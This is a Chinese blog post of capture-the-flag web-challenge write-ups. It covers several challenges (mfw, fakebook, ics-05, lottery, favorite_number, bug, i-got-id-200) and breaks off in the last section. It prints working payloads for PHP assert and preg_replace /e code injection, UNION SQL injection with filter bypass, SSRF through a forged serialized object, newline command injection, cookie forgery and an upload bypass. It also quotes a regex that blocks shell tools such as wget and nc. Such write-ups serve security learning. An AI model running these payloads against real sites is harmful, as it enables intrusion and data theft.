<h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>看到了git，可能存在git源码泄露</p>
<p><img src="https://i.loli.net/2020/12/02/M6zWQwdqsvRj1mD.png" srcset="/img/loading.gif" alt="git-1"></p>
<p>访问<a href="http://220.249.52.133:44852/.git/，确定存在源码泄露，使用githack下载源码，目录结构如图，templates下存在flag.php,它就是我们的目标。" target="_blank" rel="noopener">http://220.249.52.133:44852/.git/，确定存在源码泄露，使用githack下载源码，目录结构如图，templates下存在flag.php,它就是我们的目标。</a></p>
<p><img src="https://i.loli.net/2020/12/02/BXmiCHp5bocy7Tn.png" srcset="/img/loading.gif" alt="git-2"></p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'page'</span>])) &#123;
	$page = $_GET[<span class="hljs-string">'page'</span>];
&#125; <span class="hljs-keyword">else</span> &#123;
	$page = <span class="hljs-string">"home"</span>;
&#125;
$file = <span class="hljs-string">"templates/"</span> . $page . <span class="hljs-string">".php"</span>;

<span class="hljs-comment">// I heard '..' is dangerous!</span>
assert(<span class="hljs-string">"strpos('$file', '..') === false"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Detected hacking attempt!"</span>);

<span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span>
assert(<span class="hljs-string">"file_exists('$file')"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"That file doesn't exist!"</span>);

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p><strong>file_exists</strong>函数</p>
<p><img src="https://i.loli.net/2020/12/02/VngSuP6h2W5xbHO.png" srcset="/img/loading.gif" alt="git-3">fil</p>
<p>输入</p>
<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">page</span>=flag</code></pre></div>

<p>页面显示为空，因为file_exists只能判断文件是否存在，无法返回文件内容，这就用利用cat读取内容了。因为没有对page做其他的过滤，我们可以利用assert + system，达到命令注入的目的。</p>
<p><strong>注意：</strong>assert函数会将传入的参数当作php代码执行</p>
<p>构造payload，这里就像sql注入的语句，闭合前面的语句并填写自己想要的语句</p>
<div class="hljs"><pre><code class="hljs perl">先测试一下想法对不对
//?page=<span class="hljs-string">') or phpinfo();#</span>
<span class="hljs-string">//assert("file_exists('</span>$file<span class="hljs-string">') or phpinfo();)#</span>
<span class="hljs-string">?page='</span>)%20or%20phpinfo()%3B%23
显示出了phpinfo(),所以思路是对的
继续构造
//?page=<span class="hljs-string">') or system("cat templates/flag.php"); #</span>
<span class="hljs-string">最后的payload</span>
<span class="hljs-string"></span>
<span class="hljs-string">?page='</span>)%20or%20system(%22cat%20templates%2Fflag.php%22)%3B%23</code></pre></div>

<p><img src="https://i.loli.net/2020/12/02/Z9L2rxqjBgMyViv.png" srcset="/img/loading.gif" alt="git-4"></p>
<p><img src="https://i.loli.net/2020/12/02/U4TOzpaGBhHKlIV.png" srcset="/img/loading.gif" alt="git-5"></p>
<h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><h3 id="0x1-sql注入"><a href="#0x1-sql注入" class="headerlink" title="0x1 sql注入"></a>0x1 sql注入</h3><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
<p>接下来继续注入的常规操作。</p>
<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" srcset="/img/loading.gif" alt></p>
<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
<p><strong>爆表名</strong></p>
<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
<div class="hljs"><pre><code class="hljs livecodeserver">Notice: unserialize(): Error <span class="hljs-keyword">at</span> <span class="hljs-built_in">offset</span> <span class="hljs-number">0</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">in</span> /var/www/html/view.php <span class="hljs-keyword">on</span> <span class="hljs-title">line</span> <span class="hljs-title">31</span>

提示存在反序列化，但是不知道怎么用继续爆表。</code></pre></div>

<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" srcset="/img/loading.gif" alt></p>
<div class="hljs"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">TABLE_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>#

?<span class="hljs-keyword">no</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">'users'</span>#

/<span class="hljs-comment">/**no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS**</span></code></pre></div>

<p>爆出一大堆列名。直接读取data的内容</p>
<div class="hljs"><pre><code class="hljs crystal">?no=-<span class="hljs-number">2</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,(<span class="hljs-title">select</span> <span class="hljs-title">data</span> <span class="hljs-title">from</span> <span class="hljs-title">users</span>),3,4 <span class="hljs-comment">#</span></span></code></pre></div>

<p>发现内容是注册时信息保存为序列化内容</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:"UserInfo"</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"sunzy"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"age"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">22</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"blog"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">12</span>:<span class="hljs-string">"22.github.io"</span>;&#125;</code></pre></div>

<p>到这里就不知道怎么办了。。。</p>
<p><strong>做到这里我们大致知道了下面的信息：</strong></p>
<blockquote>
<p>view.php进行了对某个数据进行反序列化(unserializa)操作，从上面跑出的data分析是对data进行了 反序列化操作,在上一步骤中我们得到了user表有4列分别为no，passwd，data，username，并没有 单独存放blog列，所以blog显示应该是从data列取出再进行反序列化</p>
</blockquote>
<h3 id="0x02代码审计"><a href="#0x02代码审计" class="headerlink" title="0x02代码审计"></a>0x02代码审计</h3><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" srcset="/img/loading.gif" alt></p>
<p>源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">""</span>;
    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">""</span>;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, $age, $blog)</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;name = $name;
    <span class="hljs-keyword">$this</span>-&gt;age = (int)$age;
    <span class="hljs-keyword">$this</span>-&gt;blog = $blog;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($url)</span> // 处理<span class="hljs-title">url</span></span>
<span class="hljs-function"></span>&#123;  
    $ch = curl_init();   <span class="hljs-comment">//初始化一个curl会话</span>

    curl_setopt($ch, CURLOPT_URL, $url);   <span class="hljs-comment">//设置url和相应的参数</span>
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
    $output = curl_exec($ch);         	   <span class="hljs-comment">// 执行这个cURL会话</span>
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);  <span class="hljs-comment">//获取状态码</span>
    <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
    &#125;
    curl_close($ch);

    <span class="hljs-keyword">return</span> $output;
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> <span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> <span class="hljs-params">()</span> //这是注册账号时检测<span class="hljs-title">blog</span>是否合法</span>
<span class="hljs-function"></span>&#123;
    $blog = <span class="hljs-keyword">$this</span>-&gt;blog;
    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);
&#125;
&#125;</code></pre></div>

<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
<div class="hljs"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-variable">$url</span>)</span></span> 
<span class="hljs-function"><span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-variable">$this</span>-&gt;blog)</span></span></code></pre></div>

<p>这里get中的参数取自blog，所以我们可以利用反序列化构造出一个ssrf，将blog位置修改为我们想要访问的位置，结合上面的提示就构造出下面的payload：</p>
<div class="hljs"><pre><code class="hljs groovy">?no=-2%20union/**/select%201,2,3,'O:<span class="hljs-number">8</span>:<span class="hljs-string">"UserInfo"</span>:<span class="hljs-number">3</span>:&#123;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-string">s:</span><span class="hljs-number">5</span>:<span class="hljs-string">"sunzy"</span>;<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"age"</span>;<span class="hljs-string">i:</span><span class="hljs-number">22</span>;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"blog"</span>;<span class="hljs-string">s:</span><span class="hljs-number">29</span>:<span class="hljs-string">"file:///var/www/html/flag.php"</span>;&#125;<span class="hljs-string">'%20#</span></code></pre></div>

<p>查看源码，解base64。</p>
<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
<h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>进入页面只有一个是有用的，进入设备维护中心</p>
<p><img src="https://i.loli.net/2020/12/02/Qje1Yih9dwH3xnm.png" srcset="/img/loading.gif" alt="image-20201202170901536"></p>
<p>先点击云平台设备维护中心，url会发生改变出现page参数，这一看就是典型的读取源码</p>
<p>构造payload:</p>
<div class="hljs"><pre><code class="hljs awk">?page=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=index.php</code></pre></div>

<p>源码中的php代码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$page = $_GET[page];
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($page)) &#123;
<span class="hljs-keyword">if</span> (ctype_alnum($page)) &#123;
<span class="hljs-meta">?&gt;</span>
    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
    &lt;div style=<span class="hljs-string">"text-align:center"</span>&gt;
        &lt;p class="lead"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;
    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
<span class="hljs-meta">&lt;?php</span>
&#125;<span class="hljs-keyword">else</span>&#123;
<span class="hljs-meta">?&gt;</span>
        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
        &lt;div style=<span class="hljs-string">"text-align:center"</span>&gt;
            &lt;p class="lead"&gt;
                <span class="hljs-meta">&lt;?php</span>
                <span class="hljs-keyword">if</span> (strpos($page, <span class="hljs-string">'input'</span>) &gt; <span class="hljs-number">0</span>) &#123;   <span class="hljs-comment">//这里是对几个关键词的过滤，我们读取源码时没有用到这几个关键词所以没有影响</span>
                    <span class="hljs-keyword">die</span>();
                &#125;

                <span class="hljs-keyword">if</span> (strpos($page, <span class="hljs-string">'ta:text'</span>) &gt; <span class="hljs-number">0</span>) &#123;
                    <span class="hljs-keyword">die</span>();
                &#125;

                <span class="hljs-keyword">if</span> (strpos($page, <span class="hljs-string">'text'</span>) &gt; <span class="hljs-number">0</span>) &#123;
                    <span class="hljs-keyword">die</span>();
                &#125;

                <span class="hljs-keyword">if</span> ($page === <span class="hljs-string">'index.php'</span>) &#123;
                    <span class="hljs-keyword">die</span>(<span class="hljs-string">'Ok'</span>);
                &#125;
                    <span class="hljs-keyword">include</span>($page);
                    <span class="hljs-keyword">die</span>();
                <span class="hljs-meta">?&gt;</span>
        &lt;/p&gt;
        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
<span class="hljs-meta">&lt;?php</span>
&#125;&#125;
<span class="hljs-comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span>

<span class="hljs-keyword">if</span> ($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="hljs-string">'127.0.0.1'</span>) &#123; <span class="hljs-comment">//xxf头</span>

    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;   
   
    $pattern = $_GET[pat];  <span class="hljs-comment">//get 提交三个参数</span>
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($pattern) &amp;&amp; <span class="hljs-keyword">isset</span>($replacement) &amp;&amp; <span class="hljs-keyword">isset</span>($subject)) &#123;
        preg_replace($pattern, $replacement, $subject);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">die</span>();
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>前面代码没有突破点，直到看到<code>preg_replace</code></p>
<p><img src="https://i.loli.net/2020/12/02/4FfYrPBc1xE9Kzk.png" srcset="/img/loading.gif" alt="preg_replace"></p>
<p>漏洞</p>
<p>$pattern 存在 /e 模式修正符，允许代码执行</p>
<p>/e 模式修正符，是 *<em>preg_replace() *</em> 导致 $replacement 部分当做php代码来执行。</p>
<p>所以可以构造如下</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs sas">?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">'ls'</span>)<span class="hljs-variable">&amp;sub</span>=test
?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">'ls s3chahahaDir/'</span>)<span class="hljs-variable">&amp;sub</span>=test
?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">'ls s3chahahaDir/flag'</span>)<span class="hljs-variable">&amp;sub</span>=test
?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">'cat s3chahahaDir/flag/flag.php'</span>)<span class="hljs-variable">&amp;sub</span>=test</code></pre></div>

<p>参考:<a href="https://kevens10.github.io/articles/preg_replace()%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html" target="_blank" rel="noopener">https://kevens10.github.io/articles/preg_replace()%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</a> </p>
<h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><h3 id="0x1注册玩一下"><a href="#0x1注册玩一下" class="headerlink" title="0x1注册玩一下"></a>0x1注册玩一下</h3><p>​        进入页面发下是一个买彩票的，先注册一个账号，初始有20块钱，要买flag，需要99999999，显然不可能</p>
<p>还有一个买彩票的地方，每次花2块钱两个号码对了奖励五块，这些都不重要。</p>
<p><img src="https://i.loli.net/2020/12/02/f2TOhKdw1Bo9QY6.png" srcset="/img/loading.gif" alt="image-20201202220622597"></p>
<p>开始是想着通过脚本多买几次，后来发现不对啊，每次都是买完了之后中将号码才公布出来，脚本就没意义了，所以这个想法断了。</p>
<p>于是去看看了别的</p>
<h3 id="0x2-git源码泄露"><a href="#0x2-git源码泄露" class="headerlink" title="0x2 git源码泄露"></a>0x2 git源码泄露</h3><p>​        下载了好几个文件，看看了其中有用的只有<code>api.php</code>，代码太长了，复制了重要的部分</p>
<p>审计代码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">//随机生成中将号码</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">random_win_nums</span><span class="hljs-params">()</span></span>&#123;
	$result = <span class="hljs-string">''</span>;
	<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;<span class="hljs-number">7</span>; $i++)&#123;
		$result .= random_num();  <span class="hljs-comment">//利用自定义的随机函数生成随机数</span>
	&#125;
	<span class="hljs-keyword">return</span> $result;
&#125;
<span class="hljs-comment">//检测是否中奖以及 奖励和扣费规则</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy</span><span class="hljs-params">($req)</span></span>&#123;
	require_registered();  <span class="hljs-comment">//检测是否注册</span>
	require_min_money(<span class="hljs-number">2</span>);  <span class="hljs-comment">//是否有2块钱买彩票</span>

	$money = $_SESSION[<span class="hljs-string">'money'</span>];  <span class="hljs-comment">//用户的钱 </span>
	$numbers = $req[<span class="hljs-string">'numbers'</span>];   <span class="hljs-comment">//用户买的彩票号码</span>
	$win_numbers = random_win_nums();  <span class="hljs-comment">//中奖号码</span>
	$same_count = <span class="hljs-number">0</span>;              <span class="hljs-comment">//记录有几位中奖</span>
	<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;<span class="hljs-number">7</span>; $i++)&#123;		   <span class="hljs-comment">// 判断有几位中奖</span>
		<span class="hljs-keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;  <span class="hljs-comment">//重点来了</span>
			$same_count++;
		&#125;
	&#125;
    	<span class="hljs-keyword">switch</span> ($same_count) &#123;
		<span class="hljs-comment">//pass</span>
	&#125;
	$money += $prize - <span class="hljs-number">2</span>;
	$_SESSION[<span class="hljs-string">'money'</span>] = $money;
	response([<span class="hljs-string">'status'</span>=&gt;<span class="hljs-string">'ok'</span>,<span class="hljs-string">'numbers'</span>=&gt;$numbers, <span class="hljs-string">'win_numbers'</span>=&gt;$win_numbers, <span class="hljs-string">'money'</span>=&gt;$money, <span class="hljs-string">'prize'</span>=&gt;$prize]);
&#125;</code></pre></div>



<p>上面的代码看着像是没什么问题，但是对<code>==</code>敏感的一眼就会发现这里存在问题</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;<span class="hljs-number">7</span>; $i++)&#123;		   <span class="hljs-comment">// 判断有几位中奖</span>
		<span class="hljs-keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;  <span class="hljs-comment">//重点来了</span>
			$same_count++;
		&#125;
	&#125;</code></pre></div>

<p>这里判断是否相等居然用 <code>==</code>，就很离谱，也是突破点，测试效果如下 </p>
<p><img src="https://i.loli.net/2020/12/02/EpgPnUsz1FBfq9k.png" srcset="/img/loading.gif" alt="caipiao-1"></p>
<p>所以思路就是，抓包修改我们输入的号码都为True，就行了，一次中奖不够就多买几次</p>
<p><strong>注意这里上传数据时使用的是json格式</strong>，<a href="https://www.runoob.com/json/js-json-arrays.html" target="_blank" rel="noopener">json数组类型</a></p>
<p><img src="https://i.loli.net/2020/12/02/qwTPDFZXuaSitR9.png" srcset="/img/loading.gif" alt="image-20201202221043572"></p>
<p>之后返回浏览器买flag即可</p>
<h2 id="favorite-number"><a href="#favorite-number" class="headerlink" title="favorite_number"></a>favorite_number</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//php5.5.9</span>
$stuff = $_POST[<span class="hljs-string">"stuff"</span>];
$array = [<span class="hljs-string">'admin'</span>, <span class="hljs-string">'user'</span>];
<span class="hljs-keyword">if</span>($stuff === $array &amp;&amp; $stuff[<span class="hljs-number">0</span>] != <span class="hljs-string">'admin'</span>) &#123;
    $num= $_POST[<span class="hljs-string">"num"</span>];
    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/^\d+$/im"</span>,$num))&#123;
        <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">"/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i"</span>,$num))&#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"my favorite num is:"</span>;
            system(<span class="hljs-string">"echo "</span>.$num);
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'Bonjour!'</span>;
        &#125;
    &#125;
&#125; <span class="hljs-keyword">else</span> &#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125;</code></pre></div>



<h3 id="0x1代码审计"><a href="#0x1代码审计" class="headerlink" title="0x1代码审计"></a>0x1代码审计</h3><p>代码意思</p>
<blockquote>
<p>输入一个数组stuff,stuff要和array相同，但是$stuff[0] != ‘admin’</p>
<p>这是一个矛盾的判断，所以要想办法绕过</p>
<p>下面是提交一个数字，通过判断后打印出这个数字并执行system函数</p>
<p>这里一定存在命令执行</p>
</blockquote>
<p>题目直接给了源码，并且表明了php版本为5.5.9，那就说明这个题目一定和这个版本的漏洞有关，google一下</p>
<p><a href="https://segmentfault.com/q/1010000003871264，这是与这题很像的一题" target="_blank" rel="noopener">https://segmentfault.com/q/1010000003871264，这是与这题很像的一题</a></p>
<p>php5.5.9的数组的key溢出漏洞</p>
<p>结合上面的题目构造出payload:</p>
<div class="hljs"><pre><code class="hljs angelscript">stuff[<span class="hljs-number">4294967296</span>]=admin&amp;stuff[<span class="hljs-number">1</span>]=user&amp;num=<span class="hljs-number">123</span></code></pre></div>

<p>页面成功打印出了<code>my favorite num is:123</code>,说明前面已经绕过成功了</p>
<h3 id="0x2-绕过数字，命令注入"><a href="#0x2-绕过数字，命令注入" class="headerlink" title="0x2 绕过数字，命令注入"></a>0x2 绕过数字，命令注入</h3><p>因为正则表达式最后的m允许多行匹配，所以这里可以使用%0a绕过数字检测</p>
<p>开始构造出的</p>
<div class="hljs"><pre><code class="hljs angelscript">stuff[<span class="hljs-number">4294967296</span>]=admin&amp;stuff[<span class="hljs-number">1</span>]=user&amp;num=<span class="hljs-number">123</span>%<span class="hljs-number">0</span>als /</code></pre></div>

<p>成功列出了目录，看到了flag，但是读取的时候发现flag关键被过滤了</p>
<p>所以不得不换一种方法</p>
<div class="hljs"><pre><code class="hljs routeros">ls -i
<span class="hljs-comment"># 列出当前⽂件列表，取出inode</span>

<span class="hljs-comment"># find找到对应inode的⽂件</span>
<span class="hljs-builtin-name">find</span> / -inum

<span class="hljs-comment"># more读取对应的文件</span>
more `<span class="hljs-builtin-name">find</span> / -inum `</code></pre></div>



<p><img src="https://i.loli.net/2020/12/03/84FbyGXJTK157LA.png" srcset="/img/loading.gif" alt="find"></p>
<p>所以最后的payload:</p>
<div class="hljs"><pre><code class="hljs angelscript">stuff[<span class="hljs-number">4294967296</span>]=admin&amp;stuff[<span class="hljs-number">1</span>]=user&amp;num=<span class="hljs-number">111</span>%<span class="hljs-number">0</span>amore `find / -inum <span class="hljs-number">38667190</span>`</code></pre></div>



<p><img src="https://i.loli.net/2020/12/03/cesVHi2EJPogUq9.png" srcset="/img/loading.gif" alt="more"></p>
<p>参考：</p>
<blockquote>
<p><a href="https://www.coodesker.com/" target="_blank" rel="noopener">https://www.coodesker.com/</a></p>
<p><a href="https://blog.csdn.net/weixin_44604541/article/details/109365511" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44604541/article/details/109365511</a></p>
</blockquote>
<h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><h3 id="0x1获得admin权限"><a href="#0x1获得admin权限" class="headerlink" title="0x1获得admin权限"></a>0x1获得admin权限</h3><p>先注册登录看看，页面功能很简单，当点击manage时，提示需要admin账号才可以，所以接下来就要想办法拿到admin账号</p>
<p>在注册的时候有一个找回密码的功能，当我们点进去的时候可以看到，修改密码只需要生日和地址</p>
<p><img src="https://i.loli.net/2020/12/04/gMlj3mK1dIGViZS.png" srcset="/img/loading.gif" alt="image-20201204130616230"></p>
<p>这就想到了刚才登录页面显示的个人信息，那么怎么才能拿到admin的个人信息就是一个问题</p>
<p>不妨先抓包看一下，可以看到cookie中有一个user，这个值像是md5，在线解密一下</p>
<p><img src="https://i.loli.net/2020/12/04/Mok5CT4UrhnfQRE.png" srcset="/img/loading.gif" alt="image-20201204125903267"></p>
<div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">82</span>ed7a14920dd2db1b6657348656eaa5
<span class="hljs-number">7</span>:<span class="hljs-number">123</span></code></pre></div>

<p>也就是uid+username的md5值，那我们是不是可以伪造一个这样的cookie然后到个人信息的页面提交获取信息</p>
<div class="hljs"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">(<span class="hljs-number">1</span>:amdin)</span></span>=<span class="hljs-number">4</span>b9987ccafacb8d8fc08d22bbca797ba</code></pre></div>

<p><img src="https://i.loli.net/2020/12/04/hmOfpoeK4s2jyvZ.png" srcset="/img/loading.gif" alt="bug-1"></p>
<p>这样就获取了信息，再去修改密码登录</p>
<h3 id="0x2上传绕过"><a href="#0x2上传绕过" class="headerlink" title="0x2上传绕过"></a>0x2上传绕过</h3><p>登录后点击manage提示非法IP，直接抓包添加xxf，得到提示</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- index.php?module=filemanage&amp;do=???--&gt;</span></code></pre></div>

<p>访问一下上面的地址一开始以为do是submit，但是提交没反应，又改成了upload，这样就对了，出来一个上传图片的网页</p>
<p>上传php文件，出现前端检测提示</p>
<p>那就直接抓包，把php改成php5修改了MIME为image/jpeg，但是还是提示可以看出来是一个php文件，可能检测了文件开头信息，那就改成下面格式的一句话木马</p>
<p>获得了flag</p>
<p><img src="https://i.loli.net/2020/12/04/Nos2ZmYglFMIcLx.png" srcset="/img/loading.gif" alt="image-20201204132940298"></p>
<h2 id="i-got-id-200"><a href="#i-got-id-200" class="headerlink" title="i-got-id-200"></a>i-got-id-200</h2><p>题目给了三个页面，其中有一个文件上传的页面，随便上传一个文件可以发现会将文件的内容显示出来，猜测这里使用了param()函数</p>
<p><strong>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的</strong></p>
<p>给了提示<code>Perl File Upload</code>第一次见这个东西，在网上学习了一下</p>
<p>大佬猜测出的后天源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">strict</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">warning</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">CGI</span>;
my $cgi=CGI-&gt;new;
<span class="hljs-keyword">if</span>($cgi-&gt;upload(<span class="hljs-string">'file'</span>))&#123;
	my $file=$cgi-&gt;param(<span class="hljs-string">'$file'</span>);
	<span class="hljs-keyword">while</span>(&lt;$file&gt;) &#123;<span class="hljs-keyword">print</span>(<span class="hljs-string">"$_"</span>);&#125;
&#125;</code></pre></div>

<p>   1.抓包修改url和上传内容，修改成如图所示</p>
